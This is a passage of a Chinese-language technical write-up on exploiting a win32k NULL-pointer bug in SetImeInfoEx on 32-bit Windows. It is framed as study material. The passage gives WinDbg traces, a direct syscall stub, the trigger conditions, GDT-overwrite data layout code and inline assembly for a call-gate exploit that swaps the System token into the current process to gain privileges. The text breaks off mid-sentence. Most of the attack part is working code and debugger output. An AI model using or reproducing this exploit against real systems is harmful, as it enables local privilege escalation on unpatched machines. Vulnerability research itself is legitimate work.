
```
kd> !process 0 0 poc.exe

PROCESS 86e006a8  SessionId: 1  Cid: 0c80    Peb: 7ffdf000  ParentCid: 0528

    DirBase: 3eb48180  ObjectTable: 86aa1310  HandleCount:  18.

    Image: poc.exe

kd> dt nt!_eprocess 86e006a8  Win32Process

   +0x120 Win32Process : 0xfe707a90 Void

kd> .process 86e006a8  

Implicit process is now 86e006a8

WARNING: .cache forcedecodeuser is not enabled

kd> dt win32k!tagprocessinfo 0xfe707a90 

   +0x000 Process          : 0x86e006a8 _EPROCESS

   +0x004 RefCount         : 1

   ......

   +0x0b4 hdeskStartup     : 0x0000002c HDESK__

   +0x0b8 cSysExpunge      : 0x21

   +0x0bc dwhmodLibLoadedMask : 0

   +0x0c0 ahmodLibLoaded   : [32] (null) 

   +0x140 rpwinsta         : 0x88057558 tagWINDOWSTATION

   ......

kd> dx -id 0,0,ffffffff86e006a8 -r1 ((win32k!tagWINDOWSTATION *)0x88057558)

((win32k!tagWINDOWSTATION *)0x88057558)                 : 0x88057558 [Type: tagWINDOWSTATION *]

    [+0x000] dwSessionId      : 0x1 [Type: unsigned long]

    [+0x004] rpwinstaNext     : 0x0 [Type: tagWINDOWSTATION *]

    [+0x008] rpdeskList       : 0x8880f418 [Type: tagDESKTOP *]

    [+0x00c] pTerm            : 0x9482eba0 [Type: tagTERMINAL *]

    [+0x010] dwWSF_Flags      : 0x0 [Type: unsigned long]

    [+0x014] spklList         : 0xffa8f8e8 [Type: tagKL *]

    ......

kd> !object 0x88057558

Object: 88057558  Type: (865f2620) WindowStation

    ObjectHeader: 88057540 (new version)

    HandleCount: 25  PointerCount: 42

    Directory Object: 9947b3e0  Name: WinSta0

```

这里我们可以调用 `CreateWidnowStation` 创建一个窗口站, 创建好后打印句柄值, 用 `windbg` 查看该窗口站结构中的 `spklList` 成员:

```
kd> !process 0 0 poc.exe

PROCESS 866c83e0  SessionId: 1  Cid: 023c    Peb: 7ffd9000  ParentCid: 0528

    DirBase: 3eb485a0  ObjectTable: 8c33c788  HandleCount:  19.

    Image: poc.exe



kd> .process 866c83e0  

Implicit process is now 866c83e0

WARNING: .cache forcedecodeuser is not enabled

kd> !handle 3c



PROCESS 866c83e0  SessionId: 1  Cid: 023c    Peb: 7ffd9000  ParentCid: 0528

    DirBase: 3eb485a0  ObjectTable: 8c33c788  HandleCount:  19.

    Image: poc.exe



Handle table at 8c33c788 with 19 entries in use



003c: Object: 88a75c88  GrantedAccess: 00020000 Entry: 868dd078

Object: 88a75c88  Type: (865f2620) WindowStation

    ObjectHeader: 88a75c70 (new version)

        HandleCount: 1  PointerCount: 3

        Directory Object: 9947b3e0  Name: Service-0x0-13748$



kd> dt win32k!tagwindowstation 88a75c88  

   +0x000 dwSessionId      : 1

   +0x004 rpwinstaNext     : (null) 

   +0x008 rpdeskList       : (null) 

   +0x00c pTerm            : 0x9482eb80 tagTERMINAL

   +0x010 dwWSF_Flags      : 4

   +0x014 spklList         : (null) 

   ......

```

可以看到, 创建的窗口站默认情况下 `spklList` 成员为 NULL. 接下来, 我们可以调用函数 `SetProcessWindowStation` 来将窗口站和我们的程序关联.

最后就是要执行到 `SetImeInfoEx` 了, 它的上级函数是 `NtUserSetImeInfoEx`, 该函数就一个参数, 指向结构 `tagIMEINFOEX` 的指针, 它在应用层无任何导出, 这里我们可以在 Shadow SSDT 中找到该函数并计算其 Index, 然后自己调用该函数:

```
__declspec(naked) NTSTATUS NTAPI NtSetUserImeInfoEx(PVOID imeinfoex)

{

    __asm {

        mov eax, 0x1226

        mov edx, 0x7ffe0300

        call dword ptr [edx]

        ret 0x04

    }

}
```

最后将上述代码整合编译, 运行后, 即可看到蓝屏.

# 漏洞利用

通过上面我们可以知道, 当发生问题时, `keyboard_layout` 指向 NULL, 只要通过以下两个条件

1. `keyboard_layout->hkl == imeinfoex->hkl`
2. `keyboard_layout->piiex->fLoadFlag == 0`

就可以执行到 `memcpy`, 这里可以造成向任意地址写入 `sizeof(tagIMEINFOEX)` 个字节的数据. 我们只要在用户层分配零页内存当作 `keyboard_layout`, `imeinfoex` 来自用户层调用时的参数, 我们可以控制. 这样, 我们只要将 `keyboard_layout` 中的 `hkl` 和 `imeinfoex` 的 `hkl` 设置为相同的值, 并把要写入的地址设置到 `piiex`, 要写入的数据作为用户层参数下传即可. 这里注意 `piiex->fLoadFlag` 要为 0. 下面学习下两种漏洞利用方法.

## 利用一: 调用门

该方法是野外样本所用的方法, 其主要是构造一个应用层可以调用的调用门描述符, 并利用该漏洞将调用门描述符写入 `GDT` 中. 然后应用层通过调用门进入特权代码段后返回时, 并没有调用 `retf` 指令而是调用 `ret` 指令返回, 这导致在返回后 `CS` 还是特权代码段, 然后就可以用 System 的 Token 替换当前进程 Token 完成提权.

这里首先调用 `_sgdt` 获取 `GDTR` 寄存器的内容:

```
UCHAR gdt[6];

_sgdt(gdt);

PVOID gdt_base = *(PVOID *)&gdt[2];
```

然后分配 `sizeof(tagIMEINFOEX)` 大小的内存, 在其中布局要覆盖到 `GDT` 中的数据:

```
void BuildGDT(PVOID buff, PVOID gdt_base)

{

    // 填充

    for (ULONG i = 0; i < sizeof(tagIMEINFOEX) / 8; ++i) {

        *(PULONG)((PBYTE)buff + i * 8 + 4) = (ULONG)gdt_base + 0x144 + i * 8 + 0x0c;

    }



    // 构造调用门执行时的代码

    *((PBYTE)buff + 4) = 0xc3;

    // 构造调用门描述符

    *(PWORD)((PBYTE)buff + 0x24) = ((ULONG)gdt_base + 0x148) & 0xffff;    // 代码段偏移低 16 位

    *(PWORD)((PBYTE)buff + 0x26) = 0x170;    // 要执行的代码段选择子

    *(PWORD)((PBYTE)buff + 0x28) = 0xec00;

    *(PWORD)((PBYTE)buff + 0x2a) = ((ULONG)gdt_base >> 16) & 0xffff;    // 代码段偏移高 16 位

    // 构造代码段描述符

    *(PWORD)((PBYTE)buff + 0x2c) = 0xffff;

    *(PWORD)((PBYTE)buff + 0x2e) = 0;

    *((PBYTE)buff + 0x30) = 0;

    *(PWORD)((PBYTE)buff + 0x31) = 0xcf9a;

    *((PBYTE)buff + 0x33) = 0;

}
```

这里的代码从 `GDT` 偏移 `0x144` 的位置开始覆盖, 用 `Windbg` 查看 `GDT` 可以看到, 没有用到的项如下方式填充:

```
80b95100  80b95108 00000000 80b95110 00000000

80b95110  80b95118 00000000 80b95120 00000000

80b95120  80b95128 00000000 80b95130 00000000

80b95130  80b95138 00000000 80b95140 00000000

80b95140  80b95148 00000000 80b95150 00000000

80b95150  80b95158 00000000 80b95160 00000000

80b95160  80b95168 00000000 80b95170 00000000

80b95170  80b95178 00000000 80b95180 00000000
```

所以上面代码也如此填充. 这里之所以选择 `0x144` 从一个内容为 0 的地方开始, 是因为我们下传的 `tagIMEINFOEX` 的第一个成员 `hkl` 设置为了 0, 还有就是让 `piiex` 偏移 `0x48` 的位置为 0(也就是 `fLoadFlag`). 这里主要就是构造了一个代码段和该代码段要执行的代码以及一个调用门, 调用门里的代码段选择子和偏移就是我们自己构造的代码段的选择子和填充代码的位置, 按照 Intel 手册中调用门个格式构造就可以了. 这里我把调用门构造在 `GDT` 偏移 `0x168` 的位置, 也就是 `buff` 偏移 `0x24` 的位置(覆盖时从 `GDT` 偏移 `0x144` 开始覆盖). 代码段紧随其后, 要执行的代码我放在了 `GDT` 偏移 `0x148` 的位置, 这里就写了一个 `ret`.

布局好后设置触发漏洞的条件, 触发漏洞覆盖 `GDT`:

```
tagKL *null_page = (tagKL *)0;

null_page->hkl = nullptr;

null_page->piiex = (PBYTE)gdt_base + 0x144;

......

NtSetUserImeInfoEx(buff);
```

覆盖 `GDT` 以后, 就可以调用我们的调用门了:

```
__declspec(naked) void ExecuteShellcode(void)

{

    __asm {

        push ebp

        mov ebp, esp

        sub esp, 0x10

        mov word ptr [ebp - 2], 0x168    // 调用门选择子

        mov dword ptr [ebp - 6], 0

        call far fword ptr [ebp - 6]    // 调用调用门



        pop dword ptr [ebp - 4]    // 保存 R3 CS, esp 指向 R3 栈偏移和选择子

        nop    // 这里的代码在特权代码段执行, 栈为 R0 的栈

        nop

        mov eax, kPsInitialSystemProcess

        mov eax, dword ptr [eax]

        mov eax, dword ptr [eax + 0xf8]

        mov ecx, kCurrentProcessObject

        mov dword ptr [ecx + 0xf8], eax

        nop

        nop

        mov eax, dword ptr [ebp - 4]

        push eax

        push offset NORMAL

        retf    // 返回后, esp 和调用 call far 时相同



    NORMAL:

        mov esp, ebp

        pop ebp

        ret

    }

}
```

调试时在调用调用门的地方步进后中断在内核调试器中, 可以看到, 执行了我们的 `ret` 返回到 `call` 下面的的代码后, `CS` 寄存器为我们构造的代码段选择子 , 这里是 `0x170`:

```
0170:0032e753 ff5dfa          call    fword ptr [ebp-6]

0170:0032e756 8f45fc          pop     dword ptr [ebp-4] ss:0010:004ff75c=01680000

0170:0032e759 90              nop

0170:0032e75a 90              nop

0170:0032e75b a12c103e00      mov     eax,dword ptr ds:[003E102Ch]

0170:0032e760 8b00            mov     eax,dword ptr [eax]

0170:0032e762 8b80f8000000    mov     eax,dword ptr [eax+0F8h]

0170:0032e768 8b0d30103e00    mov     ecx,dword ptr ds:[3E1030h]

0170:0032e76e 8981f8000000    mov     dword ptr [ecx+0F8h],eax

0170:0032e774 90              nop
-----------------------------------
kd> r

eax=00000001 ebx=7ffd4000 ecx=004ff75c edx=779b70b4 esi=004ff768 edi=004ff888

eip=0032e756 esp=97306ca4 ebp=004ff760 iopl=0         nv up ei pl nz na pe nc

cs=0170  ss=0010  ds=0023  es=0023  fs=0038  gs=0000             efl=00000206

0170:0032e756 8f45fc          pop     dword ptr [ebp-4] ss:0010:004ff75c=01680000
```

这里注意一下, 此时虽然在特权代码段, 可以访问 `R0` 的数据, 但这里不能用 `fs` 寄存器访问 `KPCR`, 因为 `fs` 寄存器并没有被切换, `fs` 还是应用层的, 指向 `TEB`. 所以这里提前获取了内核导出的保存 `System EPROCESS` 的变量 `PsInitialSystemProcess` 和当前进程的 `EPROCESS`, 以供 `Shellcode` 使用. 这里通过以下方法获取:
